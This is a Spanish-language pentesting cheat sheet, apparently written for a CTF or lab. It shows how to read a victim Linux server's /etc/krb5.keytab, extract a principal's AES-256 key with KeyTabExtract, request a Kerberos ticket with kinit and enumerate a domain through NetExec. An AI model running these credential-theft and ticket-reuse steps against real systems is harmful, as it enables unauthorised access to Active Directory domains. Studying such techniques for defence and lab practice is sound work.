# Kerberos AD

Tags: #Kerberos #AD #Linux #Keytab 

Cuando un servidor Linux está unido o integrado con un dominio **Active Directory**, puede utilizar **Kerberos** para autenticarse contra el **Domain Controller (DC)**. El archivo `/etc/krb5.conf` contiene la configuración de Kerberos y permite identificar información como el **Realm de AD** y el **KDC/DC** utilizado para la autenticación. Por otro lado, el archivo `/etc/krb5.keytab` contiene los **principals de Kerberos** y sus **claves criptográficas asociadas**, permitiendo que el servidor o determinados servicios se autentiquen automáticamente contra el KDC sin necesidad de introducir manualmente una contraseña.

NOTA: Se necesita seguir todo el flujo para que funcione el uso del ticket. 

```bash 
❯ ls /etc/krb5*    # Buscar los archivos en el server linux víctima 
	- /etc/krb5.conf
	- /etc/krb5.keytab

❯ cat /etc/krb5.conf    # Mirar el contenido de la configuración para despues agregarla a Kali 
❯ cat /etc/krb5.keytab  # Mirar el contenido 
```

## Keytab 

* [KeyTab](https://github.com/sosdave/KeyTabExtract)

```bash 
# Extraer los datos 
❯ python3 keytabextract.py krb5.keytab  

# Salida:
REALM : ANOMALY.HSM
SERVICE PRINCIPAL : Brandon_Boyd/
AES-256 HASH : f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52

NOTA:
	- El AES256 actua como la password para la autenticación del usuario en Kerberos 
```

## Configurar /etc/krb5.con en Kali
```bash 
❯ ls -la /etc/krb5.conf
# Verificar si en Kali se tiene el siguiente archivo 

❯ sudo nvim /etc/krb5.conf
# Si no se tiene se puede crear el archivo y agregar el siguiente contenido:
```

```bash 
❯ nvim /etc/krb5.conf

	[libdefaults]
		default_realm = ANOMALY.HSM
		dns_lookup_realm = true
		dns_lookup_kdc = true
		

	[realms]
	    ANOMALY.HSM = {
	        kdc = Anomaly-DC.anomaly.hsm
	        admin_server = Anomaly-DC.anomaly.hsm
	    }
	    
	[domain_realm]
		.anomaly.hsm = ANOMALY.HSM
		anomaly.hsm = ANOMALY.HSM
```

## Autenticación Kerberos 
```bash 
❯ sudo apt install kinit 
❯ sudo apt install krb5-user     # Instalar el cliente 
```

```bash 
# Generar el ticket con Kinit 

❯ kinit -kt krb5.keytab Brandon_Boyd@ANOMALY.HSM
	# kt = Especificar el path del archivo .keytab
	# REALM : ANOMALY.HSM
	# SERVICE PRINCIPAL : Brandon_Boyd

❯ klist     # Muestra los tickets importados y la ruta '/tmp/krb5cc_0'
❯ kdestroy  # Destruir el ticket si hay un error 
```

## Enumeración LDAP 
```bash 
# Utilizar el ticket importado para enumerar 

❯ export KRB5CCNAME=/tmp/krb5cc_0 
# Para usar el ticket con Netexec o Impacket se debe de exportar la variable de entorno 

❯ kvno ldap/IP_DC
# Solicitar al DC un ticket LDAP para el usuario 
```

```bash 
❯ nxc ldap IP_DC -u Brandon_Boyd -k --use-kcache  
	# use-kcache = Indicar el uso de los tickets Kerberos que ya existen en el ccache, en lugar de pedirte una contraseña o utilizar otro método para obtener las credenciales

❯ nxc smb IP_DC -u Brandon_Boyd -k --use-kcache --users  
# Enumerar usuarios utilizaando el ticket importado 
```